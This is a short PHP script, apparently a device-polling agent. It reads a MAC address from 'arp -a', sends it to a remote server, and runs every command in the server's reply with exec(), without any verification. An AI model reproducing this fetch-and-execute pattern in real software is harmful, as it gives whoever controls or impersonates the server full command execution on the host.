<?php


error_reporting(E_ALL);
ini_set('display_errors', 0);


    $cmd = "arp -a ";
    $status = 0;
    $return = [];
    exec($cmd, $return, $status);

    $pegamac = explode(" ",$return[0]);

    $devicemac = $pegamac[3];

    $url = 'https://yami.run.ymi.com.br/devices/';
    $data = array("deviceid" => $devicemac);
    $ch=curl_init($url);
    $data_string = urlencode(json_encode($data));
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);


    $result = curl_exec($ch);
    curl_close($ch);

    $convert_json = (array)json_decode($result);


    foreach ($convert_json['command'] as $key=>$value) {
        exec($value, $retorno);
    }


?>
